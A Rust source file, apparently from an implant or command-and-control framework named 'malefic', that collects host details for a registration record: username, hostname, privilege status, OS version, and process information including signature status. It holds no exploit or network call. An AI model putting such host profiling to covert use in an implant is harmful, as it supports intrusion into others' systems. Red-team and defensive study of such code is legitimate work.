use malefic_proto::proto::modulepb::{Os, Process, SysInfo};

pub fn get_register_info() -> Option<SysInfo> {
    #[cfg(feature = "register_info")]
    return get_sysinfo();

    #[cfg(not(feature = "register_info"))]
    return none_sysinfo();
}

#[cfg(feature = "register_info")]
fn get_sysinfo() -> Option<SysInfo> {
    let info = malefic_sysinfo::get_sysinfo();
    let os = info.os.unwrap_or_else(|| malefic_sysinfo::Os {
        name: std::env::consts::OS.to_string(),
        version: String::new(),
        release: String::new(),
        arch: std::env::consts::ARCH.to_string(),
        username: String::new(),
        hostname: String::new(),
        locale: String::new(),
        clr_version: Vec::new(),
    });
    let process = info.process.unwrap_or_default();
    Some(SysInfo {
        filepath: info.filepath,
        workdir: info.workdir,
        is_privilege: info.is_privilege,
        os: Some(Os {
            name: os.name,
            version: os.version,
            release: os.release,
            arch: os.arch,
            username: os.username,
            hostname: os.hostname,
            locale: os.locale,
            clr_version: os.clr_version,
        }),
        process: Some(Process {
            name: process.name,
            pid: process.pid,
            ppid: process.ppid,
            arch: process.arch,
            owner: process.owner,
            path: process.path,
            args: process.args,
            uid: "".to_string(),
            signed: process.signed,
            signature_status: process.signature_status,
            signer: process.signer,
            issuer: process.issuer,
        }),
    })
}

#[cfg(not(feature = "register_info"))]
fn none_sysinfo() -> Option<SysInfo> {
    const OS_NAME: &str = std::env::consts::OS;
    const OS_ARCH: &str = std::env::consts::ARCH;

    Some(SysInfo {
        filepath: "".to_string(),
        workdir: "".to_string(),
        is_privilege: false,
        os: Some(Os {
            name: OS_NAME.to_string(),
            version: "".to_string(),
            release: "".to_string(),
            arch: OS_ARCH.to_string(),
            username: "".to_string(),
            hostname: "".to_string(),
            locale: "".to_string(),
            clr_version: vec![],
        }),
        process: Some(Process {
            name: "".to_string(),
            pid: 0,
            ppid: 0,
            arch: OS_ARCH.to_string(),
            owner: "".to_string(),
            path: "".to_string(),
            args: "".to_string(),
            uid: "".to_string(),
            signed: false,
            signature_status: "".to_string(),
            signer: "".to_string(),
            issuer: "".to_string(),
        }),
    })
}
